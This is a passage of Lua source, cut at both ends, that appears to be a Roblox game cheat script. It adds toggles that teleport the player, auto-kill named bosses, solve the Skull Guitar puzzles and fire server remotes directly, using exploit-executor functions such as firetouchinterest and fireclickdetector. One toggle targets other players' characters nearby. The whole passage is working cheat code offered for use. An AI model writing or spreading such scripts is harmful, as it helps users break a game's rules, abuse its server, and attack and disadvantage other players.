                            Kill(v42, _G.farmsb)

                            if v42.Humanoid.Health > 0 and _G.farmsb ~= false then
                                n3 = 23
                            else
                                n3 = 21
                            end
                        elseif n3 == 24 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                            n3 = 31
                        elseif n3 == 25 then
                            if not localPlayer.Backpack:FindFirstChild("Torch") and not localPlayer.Character:FindFirstChild("Torch") then
                                n3 = 27
                            else
                                n3 = 26
                            end
                        elseif n3 == 26 then
                            EquipWeapon("Torch")
                            firetouchinterest(localPlayer.Character.Torch.Handle, workspace.Map.Desert.Burn.Fire, 0)
                            firetouchinterest(localPlayer.Character.Torch.Handle, workspace.Map.Desert.Burn.Fire, 1)
                            tween(CFrame.new(1114.61475, 5.04679728, 4350.22803, -0.648466587, -1.28799094e-09, 0.761243105, -5.70652914e-10, 1, 1.20584542e-09, -0.761243105, 3.47544882e-10, -0.648466587))
                            n3 = 31
                        elseif n3 == 27 then
                            tween(CFrame.new(-1610.00757, 11.5049858, 164.001587, 0.984807551, -0.167722285, -0.0449818149, 0.17364943, 0.951244235, 0.254912198, 3.42372805e-05, -0.258850515, 0.965917408))
                            n3 = 31
                        elseif n3 == 28 then
                            if (CFrame.new(-1612.55884, 36.9774132, 148.719543, 0.37091279, 3.0717151e-09, -0.928667724, 3.97099491e-08, 1, 1.91679348e-08, 0.928667724, -4.39869794e-08, 0.37091279).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
                                n3 = 30
                            else
                                n3 = 29
                            end
                        elseif n3 == 29 then
                            tween(CFrame.new(-1612.55884, 36.9774132, 148.719543, 0.37091279, 3.0717151e-09, -0.928667724, 3.97099491e-08, 1, 1.91679348e-08, 0.928667724, -4.39869794e-08, 0.37091279))
                            n3 = 31
                        elseif n3 == 30 then
                            tween(localPlayer.Character.HumanoidRootPart.CFrame)
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate1.Button.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate2.Button.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate3.Button.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate4.Button.CFrame
                            wait(0.5)
                            localPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.Jungle.QuestPlates.Plate5.Button.CFrame
                            wait(0.5)
                            n3 = 31
                        elseif n3 == 31 then
                            return
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Cool Glasses",
            Default = GetSetting("coolshad", false),
            Callback = function(coolshad)
                _G.coolshad = coolshad
                _G.SaveData.coolshad = coolshad
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.2) do
                if _G.coolshad then
                    pcall(function()
                        local Cyborg = MobCheck("Cyborg")

                        if Cyborg then
                            repeat
                                task.wait()
                                Kill(Cyborg, _G.coolshad)
                            until _G.coolshad == false or not Cyborg.Parent or Cyborg.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(6094.0249023438, 73.770050048828, 3825.7348632813))
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Usoap's Hat",
            Default = GetSetting("AutoGetUsoap", false),
            Callback = function(autoGetUsoap)
                _G.AutoGetUsoap = autoGetUsoap
                _G.SaveData.AutoGetUsoap = autoGetUsoap
                SaveSettings()
            end,
        })

        spawn(function()
            while task.wait(1) do
                pcall(function()
                    local v31, v32, v33, v34, v35, v36, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            if _G.AutoGetUsoap then
                                n3 = 2
                            else
                                n3 = 6
                            end
                        elseif n3 == 2 then
                            v31, v32, v33 = pairs(workspace.Characters:GetChildren())
                            v34 = v33
                            n3 = 3
                        elseif n3 == 3 then
                            v35, v36 = v31(v32, v34)

                            if v35 == nil then
                                n3 = 6
                            else
                                n3 = 4
                            end
                        elseif n3 == 4 then
                            v34 = v35

                            if v36.Name ~= localPlayer.Name and v36.Humanoid.Health > 0 and v36:FindFirstChild("HumanoidRootPart") and v36.Parent and (humanoidRootPart.Position - v36.HumanoidRootPart.Position).Magnitude <= 230 then
                                n3 = 5
                            else
                                n3 = 3
                            end
                        elseif n3 == 5 then
                            task.wait()
                            EquipWeapon(_G.SelectWeapon)
                            tween(v36.HumanoidRootPart.CFrame * CFrame.new(1, 1, 2))

                            if _G.AutoGetUsoap ~= false and v36.Humanoid.Health > 0 and v36.Parent and v36:FindFirstChild("HumanoidRootPart") and v36:FindFirstChild("Humanoid") then
                                n3 = 5
                            else
                                n3 = 3
                            end
                        elseif n3 == 6 then
                            return
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Warden Sword",
            Default = GetSetting("WardenBoss", false),
            Callback = function(wardenBoss)
                _G.WardenBoss = wardenBoss
                _G.SaveData.WardenBoss = wardenBoss
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.WardenBoss then
                    pcall(function()
                        local v31 = MobCheck("Chief Warden")

                        if v31 then
                            repeat
                                wait()
                                Kill(v31, _G.WardenBoss)
                            until _G.WardenBoss == false or not v31.Parent or v31.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(5206.92578, 0.997753382, 814.976746, 0.342041343, -0.00062915677, 0.939684749, 0.00191645394, 0.999998152, -2.80422337e-05, -0.939682961, 0.00181045406, 0.342041939))
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Marine Coat",
            Default = GetSetting("MarinesCoat", false),
            Callback = function(marinesCoat)
                _G.MarinesCoat = marinesCoat
                _G.SaveData.MarinesCoat = marinesCoat
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.MarinesCoat then
                    pcall(function()
                        local v31 = MobCheck("Vice Admiral")

                        if v31 then
                            repeat
                                wait()
                                Kill(v31, _G.MarinesCoat)
                            until _G.MarinesCoat == false or not v31.Parent or v31.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-5006.5454101563, 88.032081604004, 4353.162109375))
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Swan Coat",
            Default = GetSetting("SwanCoat", false),
            Callback = function(swanCoat)
                _G.SwanCoat = swanCoat
                _G.SaveData.SwanCoat = swanCoat
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.SwanCoat then
                    pcall(function()
                        local Swan = MobCheck("Swan")

                        if Swan then
                            repeat
                                wait()
                                Kill(Swan, _G.SwanCoat)
                            until _G.SwanCoat == false or not Swan.Parent or Swan.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(5325.09619, 7.03906584, 719.570679, -0.309060812, 0, 0.951042235, 0, 1, 0, -0.951042235, 0, -0.309060812))
                        end
                    end)
                end
            end
        end)
    end

    if World2 then
        v4:AddSection("Rengoku")

        v4:AddToggle({
            Name = "Auto Rengoku Sword",
            Default = GetSetting("iceboss", false),
            Callback = function(iceboss)
                _G.iceboss = iceboss
                _G.SaveData.iceboss = iceboss
                SaveSettings()
            end,
        })

        spawn(function()
            pcall(function()
                local v31, n3
                n3 = 1

                while true do
                    if n3 == 1 then
                        if wait(0.1) then
                            n3 = 2
                        else
                            n3 = 6
                        end
                    elseif n3 == 2 then
                        if _G.iceboss then
                            n3 = 3
                        else
                            n3 = 1
                        end
                    elseif n3 == 3 then
                        v31 = MobCheck("Awakened Ice Admiral")

                        if v31 then
                            n3 = 4
                        else
                            n3 = 5
                        end
                    elseif n3 == 4 then
                        task.wait()
                        Kill(v31, _G.iceboss)

                        if _G.iceboss ~= false and v31.Parent and v31.Humanoid.Health > 0 then
                            n3 = 4
                        else
                            n3 = 1
                        end
                    elseif n3 == 5 then
                        tween(CFrame.new(5668.9780273438, 28.519989013672, -6483.3520507813))
                        n3 = 1
                    elseif n3 == 6 then
                        return
                    end
                end
            end)
        end)

        v4:AddToggle({
            Name = "Auto Key Rengoku",
            Default = GetSetting("keys", false),
            Callback = function(keys)
                _G.keys = keys
                _G.SaveData.keys = keys
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                pcall(function()
                    if _G.keys then
                        if not localPlayer.Backpack:FindFirstChild(tbl6[3]) and not localPlayer.Character:FindFirstChild(tbl6[3]) then
                            local v31 = MobCheck(tbl6)

                            if v31 then
                                repeat
                                    task.wait()
                                    Kill(v31, _G.keys)
                                until localPlayer.Backpack:FindFirstChild(tbl6[3]) or _G.keys == false or not v31.Parent or v31.Humanoid.Health <= 0
                            else
                                tween(CFrame.new(5439.716796875, 84.420944213867, -6715.1635742188))
                            end
                        else
                            EquipWeapon(tbl6[3])
                            wait(0.1)
                            tween(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                        end
                    end
                end)
            end
        end)

        v4:AddSection("Second Sea Items")

        v4:AddToggle({
            Name = "Auto Dragon Trident",
            Default = GetSetting("tridenw2", false),
            Callback = function(tridenw2)
                _G.tridenw2 = tridenw2
                _G.SaveData.tridenw2 = tridenw2
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                pcall(function()
                    if _G.tridenw2 then
                        local v31 = MobCheck("Tide Keeper")

                        if v31 then
                            repeat
                                task.wait()
                                Kill(v31, _G.tridenw2)
                            until _G.tridenw2 == false or not v31.Parent or v31.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-3795.6423339844, 105.88877105713, -11421.307617188))
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Long Sword",
            Default = GetSetting("daisw", false),
            Callback = function(daisw)
                _G.daisw = daisw
                _G.SaveData.daisw = daisw
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                pcall(function()
                    if _G.daisw then
                        local Diamond = MobCheck("Diamond")

                        if Diamond then
                            repeat
                                task.wait()
                                Kill(Diamond, _G.daisw)
                            until _G.daisw == false or not Diamond.Parent or Diamond.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-1576.7166748047, 198.59265136719, 13.724286079407))
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Black Spikey",
            Default = GetSetting("blsp", false),
            Callback = function(blsp)
                _G.blsp = blsp
                _G.SaveData.blsp = blsp
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.blsp then
                    pcall(function()
                        local Jeremy = MobCheck("Jeremy")

                        if Jeremy then
                            repeat
                                wait()
                                Kill(Jeremy, _G.blsp)
                            until _G.blsp == false or not Jeremy.Parent or Jeremy.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(2006.9261474609, 448.95666503906, 853.98284912109))
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Dark Blade V3",
            Default = GetSetting("DarkBladev3", false),
            Callback = function(darkBladev3)
                _G.DarkBladev3 = darkBladev3
                _G.SaveData.DarkBladev3 = darkBladev3
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.DarkBladev3 and World2 then
                        if not LayItems("Dark Blade") then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadItem", "Dark Blade")
                        end

                        if LayItems("Fist of Darkness") > 1 then
                            if workspace.Enemies:FindFirstChild("Darkbeard") then
                                if MobCheck("Darkbeard") and LayItems("Fist of Darkness") >= 1 then
                                    repeat
                                        wait()
                                        tween(CFrame.new(-5719.36376953125, 48.50590515136719, -782.9759521484375))
                                    until not _G.DarkBladev3 or humanoidRootPart.Position == CFrame.new(-5719.36376953125, 48.50590515136719, -782.9759521484375).Position

                                    fireclickdetector(workspace.Map.GraveIsland.Mountain.Rocks.Button.ClickDetector)
                                end
                            else
                                tween(CFrame.new(3677.08203125, 62.751937866211, -3144.8332519531))
                            end
                        else
                            _G.collectruong = true
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Midnight Blade",
            Default = GetSetting("ecboss", false),
            Callback = function(ecboss)
                _G.ecboss = ecboss
                _G.SaveData.ecboss = ecboss
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.ecboss then
                        if LayMaterial("Ectoplasm") >= 99 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 3)
                        elseif LayMaterial("Ectoplasm") <= 99 then
                            local v31 = MobCheck("Cursed Captain")

                            if v31 then
                                repeat
                                    wait()
                                    Kill(v31, _G.ecboss)
                                until not _G.ecboss or not v31.Parent or v31.Humanoid.Health <= 0
                            else
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                wait(0.5)
                                tween(CFrame.new(916.928589, 181.092773, 33422))
                            end
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Darkbeard",
            Default = GetSetting("dakcoat", false),
            Callback = function(dakcoat)
                _G.dakcoat = dakcoat
                _G.SaveData.dakcoat = dakcoat
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.dakcoat then
                    pcall(function()
                        if LayItems("Fist of Darkness") and not workspace.Enemies:FindFirstChild("Darkbeard") then
                            tween(CFrame.new(3677.08203125, 62.751937866211, -3144.8332519531))
                        elseif MobCheck("Darkbeard") then
                            local Darkbeard = MobCheck("Darkbeard")

                            if Darkbeard then
                                repeat
                                    wait()
                                    Kill(Darkbeard, _G.dakcoat)
                                until _G.dakcoat == false or not Darkbeard.Parent or Darkbeard.Humanoid.Health <= 0
                            end
                        elseif not LayItems("Fist of Darkness") and not MobCheck("Darkbeard") then
                            repeat
                                wait(0.1)
                                _G.collectruong = true
                            until not _G.dakcoat or LayItems("Fist of Darkness") or MobCheck("Darkbeard")

                            _G.collectruong = false
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Unlock Don Swan",
            Default = GetSetting("Auto_DonAcces", false),
            Callback = function(autoDonAcces)
                _G.Auto_DonAcces = autoDonAcces
                _G.SaveData.Auto_DonAcces = autoDonAcces
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.Auto_DonAcces then
                    pcall(function()
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil and localPlayer.Data.Level.Value >= 1500 then
                            FruitPrice = {}
                            FruitStore = {}
                            local v31 = next
                            local response, v32 = game:GetService("ReplicatedStorage"):WaitForChild("Remotes").CommF_:InvokeServer("GetFruits")

                            for k, v33 in v31, response, v32 do
                                if v33.Price >= 1000000 then
                                    table.insert(FruitPrice, v33.Name)
                                end
                            end

                            local v33, v34, v35 = pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventoryFruits"))
                            local v36 = v35
                            local v37 = v33
                            local v38 = v34

                            while true do
                                local v39, v40 = v37(v38, v36)
                                if v39 == nil then
                                    break
                                end

                                for k, v41 in pairs(v40) do
                                    if k == "Name" then
                                        table.insert(FruitStore, v41)
                                    end
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin", "Buy")
                                local v41, v42, v43 = pairs(FruitPrice)
                                local v44 = v43
                                local v45 = v41
                                local v46 = v42
                                local v47 = v39
                                local v48 = v37
                                local v49 = v38

                                while true do
                                    local v50, v51 = v45(v46, v44)
                                    if v50 == nil then
                                        break
                                    end

                                    for k, v52 in pairs(FruitStore) do
                                        if v51 == v52 and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                                            _G.StoreF = false

                                            if localPlayer.Backpack:FindFirstChild(FruitStore) then
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor", "1")
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor", "2")
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor", "3")
                                            else
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", tostring(v51))
                                            end
                                        end
                                    end

                                    v44 = v50
                                end

                                v36 = v47
                                v37 = v48
                                v38 = v49

                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess ~= nil then
                                    _G.StoreF = true
                                    _G.Auto_DonAcces = false
                                end
                            end
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Swan Glasses",
            Default = GetSetting("swann", false),
            Callback = function(swann)
                _G.swann = swann
                _G.SaveData.swann = swann
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.2) do
                if _G.swann then
                    pcall(function()
                        local v31 = MobCheck("Don Swan")

                        if v31 then
                            repeat
                                wait()
                                Kill(v31, _G.swann)
                            until _G.swann == false or not v31.Parent or v31.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(2286.2004394531, 15.177839279175, 863.8388671875))
                        end
                    end)
                end
            end
        end)
    end

    if World1 then
        v4:AddSection("Bosses")

        v4:AddToggle({
            Name = "Auto Whitebeard",
            Default = GetSetting("whitebeard", false),
            Callback = function(whitebeard)
                _G.whitebeard = whitebeard
                _G.SaveData.whitebeard = whitebeard
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(1) do
                if _G.whitebeard then
                    pcall(function()
                        local whitebeard = MobCheck("whitebeard")

                        if whitebeard then
                            repeat
                                wait()
                                Kill(whitebeard, _G.whitebeard)
                            until _G.whitebeard == false or not whitebeard.Parent or whitebeard.Humanoid.Health <= 0
                        else
                            tween(CFrame.new(-5023.38330078125, 28.65203285217285, 4332.3818359375))
                        end
                    end)
                end
            end
        end)
    end
end

if World3 then
    v4:AddSection("Third Sea Items")

    v4:AddToggle({
        Name = "Auto Buddy",
        Default = GetSetting("memaybeo", false),
        Callback = function(memaybeo)
            _G.memaybeo = memaybeo
            _G.SaveData.memaybeo = memaybeo
            SaveSettings()
        end,
    })

    spawn(function()
        while wait(1) do
            if _G.memaybeo then
                pcall(function()
                    local v10 = MobCheck("Cake Queen")

                    if v10 then
                        repeat
                            task.wait()
                            Kill(v10, _G.memaybeo)
                        until not _G.memaybeo or not v10.Parent or v10.Humanoid.Health <= 0
                    else
                        tween(CFrame.new(-709.3132934570312, 381.6005859375, -11011.396484375))
                    end
                end)
            end
        end
    end)

    v4:AddToggle({
        Name = "Auto Canvender",
        Default = GetSetting("cavender", false),
        Callback = function(cavender)
            _G.cavender = cavender
            _G.SaveData.cavender = cavender
            SaveSettings()
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.cavender then
                    local v10 = MobCheck("Beautiful Pirate")

                    if v10 then
                        repeat
                            wait()
                            Kill(v10, _G.cavender)
                        until not _G.cavender or v10.Humanoid.Health <= 0
                    else
                        tween(CFrame.new(5283.609375, 22.56223487854, -110.78285217285))
                    end
                end
            end)
        end
    end)

    v4:AddToggle({
        Name = "Auto Twin Hooks",
        Default = GetSetting("twh", false),
        Callback = function(twh)
            _G.twh = twh
            _G.SaveData.twh = twh
            SaveSettings()
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.twh then
                    local v10 = MobCheck("Captain Elephant")

                    if v10 then
                        repeat
                            wait()
                            Kill(v10, _G.twh)
                        until not _G.twh or v10.Humanoid.Health <= 0
                    else
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-12471.169921875, 374.94024658203, -7551.677734375))
                        wait(0.2)
                        tween(CFrame.new(-13376.7578125, 433.28689575195, -8071.392578125))
                    end
                end
            end)
        end
    end)

    v4:AddToggle({
        Name = "Auto Serpent Bow",
        Default = GetSetting("cungmangxa", false),
        Callback = function(cungmangxa)
            _G.cungmangxa = cungmangxa
            _G.SaveData.cungmangxa = cungmangxa
            SaveSettings()
        end,
    })

    spawn(function()
        local v10, n
        n = 1

        while true do
            if n == 1 then
                if wait(1) then
                    n = 2
                else
                    n = 6
                end
            elseif n == 2 then
                if _G.cungmangxa then
                    n = 3
                else
                    n = 1
                end
            elseif n == 3 then
                v10 = MobCheck("Hydra Leader")

                if v10 then
                    n = 4
                else
                    n = 5
                end
            elseif n == 4 then
                wait()
                Kill(v10, _G.cungmangxa)

                if _G.cungmangxa and v10.Parent and v10.Humanoid.Health > 0 then
                    n = 4
                else
                    n = 1
                end
            elseif n == 5 then
                tween(CFrame.new(5821.89794921875, 1019.0950927734375, -73.71923065185547))
                n = 1
            elseif n == 6 then
                return
            end
        end
    end)

    v4:AddToggle({
        Name = "Auto Lei Accessory",
        Default = GetSetting("kilo", false),
        Callback = function(kilo)
            _G.kilo = kilo
            _G.SaveData.kilo = kilo
            SaveSettings()
        end,
    })

    spawn(function()
        while wait(0.2) do
            if _G.kilo then
                pcall(function()
                    local v10 = MobCheck("Kilo Admiral")

                    if v10 then
                        repeat
                            task.wait()
                            Kill(v10, _G.kilo)
                        until not _G.kilo or not v10.Parent or v10.Humanoid.Health <= 0
                    else
                        tween(CFrame.new(2764.2233886719, 432.46154785156, -7144.4580078125))
                    end
                end)
            end
        end
    end)

    v2:AddSection("Skull Guitars")
    local v10 = v2:AddParagraph("Skull Guitar Quests", "")

    spawn(function()
        while wait(0.2) do
            pcall(function()
                if Quest1 == true then
                    v10:Set(" Quest Number : Quest1")
                elseif Quest2 == true then
                    v10:Set(" Quest Number : Quest2")
                elseif Quest3 == true then
                    v10:Set(" Quest Number : Quest3")
                elseif Quest4 == true then
                    v10:Set(" Quest Number : Quest4")
                elseif GetWP("Skull Guitar") then
                    v10:Set(" Quest Number : Collect!!")
                else
                    v10:Set(" Quest Number : No Quest!!")
                end
            end)
        end
    end)

    v2:AddToggle({
        Name = "Auto Skull Guitar",
        Default = false,
        Callback = function(skullguitar)
            _G.skullguitar = skullguitar
        end,
    })

    task.spawn(function()
        while wait() do
            if _G.skullguitar then
                pcall(function()
                    local v11 = MobCheck("Living Zombie")

                    if v11 then
                        v11.HumanoidRootPart.CFrame = CFrame.new(-10138.3974609375, 138.6524658203125, 5902.89208984375)
                        v11.Head.CanCollide = false
                        v11.Humanoid.Sit = false
                        v11.HumanoidRootPart.CanCollide = false
                        v11.Humanoid.JumpPower = 0
                        v11.Humanoid.WalkSpeed = 0

                        if v11.Humanoid:FindFirstChild("Animator") then
                            v11.Humanoid:FindFirstChild("Animator"):Destroy()
                        end
                    end
                end)
            end
        end
    end)

    getT = function(arg)
        local rotation = nil

        if arg == 1 then
            rotation = workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation
        elseif arg == 3 then
            rotation = workspace.Map["Haunted Castle"].Tablet.Segment3.Line.Rotation
        elseif arg == 4 then
            rotation = workspace.Map["Haunted Castle"].Tablet.Segment4.Line.Rotation
        elseif arg == 7 then
            rotation = workspace.Map["Haunted Castle"].Tablet.Segment7.Line.Rotation
        elseif arg == 10 then
            rotation = workspace.Map["Haunted Castle"].Tablet.Segment10.Line.Rotation
        end

        if not rotation then
            return
        end
        return rotation.Z
    end

    getRT = function(arg)
        local rotation = nil

        for k, child in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do
            if arg == 1 and child.Name == "Trophy1" and child:FindFirstChild("Handle") then
                rotation = child.Handle.Rotation
            elseif arg == 2 and child.Name == "Trophy2" and child:FindFirstChild("Handle") then
                rotation = child.Handle.Rotation
            elseif arg == 3 and child.Name == "Trophy3" and child:FindFirstChild("Handle") then
                rotation = child.Handle.Rotation
            elseif arg == 4 and child.Name == "Trophy4" and child:FindFirstChild("Handle") then
                rotation = child.Handle.Rotation
            elseif arg == 5 and child.Name == "Trophy5" and child:FindFirstChild("Handle") then
                rotation = child.Handle.Rotation
            end

            if rotation then
                return rotation.Z
            end
        end
    end

    GetFirePlacard = function(arg, arg2)
        if tostring(workspace.Map["Haunted Castle"]["Placard" .. arg][arg2].Indicator.BrickColor) ~= "Pearl" then
            fireclickdetector(workspace.Map["Haunted Castle"]["Placard" .. arg][arg2].ClickDetector)
        end
    end

    spawn(function()
        repeat
            task.wait()
        until _G.skullguitar

        while wait(1) do
            pcall(function()
                if _G.skullguitar and World3 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)

                    if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check") == nil then
                        tween(CFrame.new(-8655.0166015625, 141.3166961669922, 6160.0224609375))
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Swamp == false then
                        Quest1 = true
                        Quest2 = false
                        Quest3 = false
                        Quest4 = false
                        local v11 = MobCheck("Living Zombie")

                        if v11 then
                            repeat
                                task.wait()
                                Kill(v11, _G.skullguitar)
                            until not _G.skullguitar or v11.Humanoid.Health <= 0 or not v11.Parent or workspace.Map["Haunted Castle"].SwampWater.Color ~= Color3.fromRGB(117, 0, 0)
                        else
                            tween(CFrame.new(-10170.7275390625, 138.6524658203125, 5934.26513671875))
                        end
                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Gravestones == false then
                        Quest1 = false
                        Quest2 = true
                        Quest3 = false
                        Quest4 = false
                        GetFirePlacard("7", "Left")
                        GetFirePlacard("6", "Left")
                        GetFirePlacard("5", "Left")
                        GetFirePlacard("4", "Right")
                        GetFirePlacard("3", "Left")
                        GetFirePlacard("2", "Right")
                        GetFirePlacard("1", "Right")
                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Ghost == false then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Trophies == false then
                        Quest1 = false
                        Quest2 = false
                        Quest3 = true
                        Quest4 = false
                        tween(CFrame.new(-9532.8232421875, 6.471667766571045, 6078.068359375))
                        local v11, v12

                        repeat
                            wait()
                            v11 = getRT(1)
                            v12 = getT(1)

                            if v11 and v12 then
                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment1:FindFirstChild("ClickDetector"))
                            end
                        until v11 == v12

                        local v13, v14

                        repeat
                            wait()
                            v13 = getRT(2)
                            v14 = getT(3)

                            if v13 and v14 then
                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment3:FindFirstChild("ClickDetector"))
                            end
                        until v13 == v14

                        local v15, v16

                        repeat
                            wait()
                            v15 = getRT(3)
                            v16 = getT(4)

                            if v15 and v16 then
                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment4:FindFirstChild("ClickDetector"))
                            end
                        until v15 == v16

                        local v17, v18

                        repeat
                            wait()
                            v17 = getRT(4)
                            v18 = getT(7)

                            if v17 and v18 then
                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment7:FindFirstChild("ClickDetector"))
                            end
                        until v17 == v18

                        local v19, v20

                        repeat
                            wait()
                            v19 = getRT(5)
                            v20 = getT(10)

                            if v19 and v20 then
                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment10:FindFirstChild("ClickDetector"))
                            end
                        until v19 == v20

                        repeat
                            wait()
                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment2:FindFirstChild("ClickDetector"))
                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment5:FindFirstChild("ClickDetector"))
                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment6:FindFirstChild("ClickDetector"))
                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment8:FindFirstChild("ClickDetector"))
                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment9:FindFirstChild("ClickDetector"))
                        until workspace.Map["Haunted Castle"].Tablet.Segment2.Line.Rotation.Z == 0 or workspace.Map["Haunted Castle"].Tablet.Segment5.Line.Rotation.Z == 0 or workspace.Map["Haunted Castle"].Tablet.Segment6.Line.Rotation.Z == 0 or workspace.Map["Haunted Castle"].Tablet.Segment8.Line.Rotation.Z == 0 or workspace.Map["Haunted Castle"].Tablet.Segment9.Line.Rotation.Z == 0
                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Pipes == false then
                        Quest1 = false
                        Quest2 = false
                        Quest3 = false
                        Quest4 = true
                        tween(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.CFrame)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.ClickDetector)
                        tween(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.CFrame)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                        tween(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.CFrame)
